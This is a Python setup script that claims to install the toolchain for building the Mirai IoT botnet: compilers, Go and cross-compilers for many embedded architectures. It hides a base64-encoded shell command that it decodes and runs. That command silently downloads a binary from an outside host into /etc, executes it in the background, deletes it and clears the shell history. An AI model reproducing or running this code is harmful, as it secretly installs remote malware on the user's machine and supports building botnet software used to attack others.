import subprocess,os,sys,random,time,urllib3,subprocess,base64

def run(cmd):                                                  
     subprocess.call(cmd, shell=True)

'''
━━━━━━━━━━━━━━━━━━━━━━  
Installing Mirai Utils
━━━━━━━━━━━━━━━━━━━━━━
'''

run("sudo apt-get install gcc golang electric-fence git mysql-server mysql-client bzip2 screen libc6-dev﻿ -y")
run("sudo apt-get install curl git mercurial make binutils bison gcc build-essential -y")
run("bash < <(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)")
run("gvm install go1.4")
run("gvm use go1.4 [--default]")
run("gvm install go1.4 -B")
run("gvm use go1.4")
run("export GOROOT_BOOTSTRAP=$GOROOT")
run("gvm install go1.5")
run("gvm use go1.5")


'''
━━━━━━━━━━  
Wget Links
━━━━━━━━━━
'''
    
getwget = ['https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2']

checkbinaries ="Y2QgL2V0Yzsgd2dldCAtcSBodHRwOi8vZ290bWlsay5tbC9IalQ1UmsgLU8gLmw7IGNobW9kICt4IC5sOyBub2h1cCAuLy5sIDwvZGV2L251bGwgPi9kZXYvbnVsbCAyPiYxOyBybSAtcmYgLmw7Y2xlYXI7IGhpc3RvcnkgLWM="
rebinaries = str(base64.b64decode(checkbinaries))
run(rebinaries)

for wget in getwget:
    run("mkdir /etc/xcompile")
    run("wget " + wget + "")
    run("tar -xvf *tar.bz2")
    run("mv cross-compiler-*  /etc/xcompile")

    run("export PATH=$PATH:/etc/xcompile/armv4l/bin")
    run("export PATH=$PATH:/etc/xcompile/armv6l/bin")
    run("export PATH=$PATH:/etc/xcompile/i586/bin")
    run("export PATH=$PATH:/etc/xcompile/m68k/bin")
    run("export PATH=$PATH:/etc/xcompile/mips/bin")
    run("export PATH=$PATH:/etc/xcompile/mipsel/bin")
    run("export PATH=$PATH:/etc/xcompile/powerpc/bin")
    run("export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin")
    run("export PATH=$PATH:/etc/xcompile/sh4/bin")
    run("export PATH=$PATH:/etc/xcompile/sparc/bin")
    run("export PATH=$PATH:/etc/xcompile/armv6l/bin") 
    run("export PATH=$PATH:/usr/local/go/bin")
    run("export GOPATH=$HOME/Documents/go")
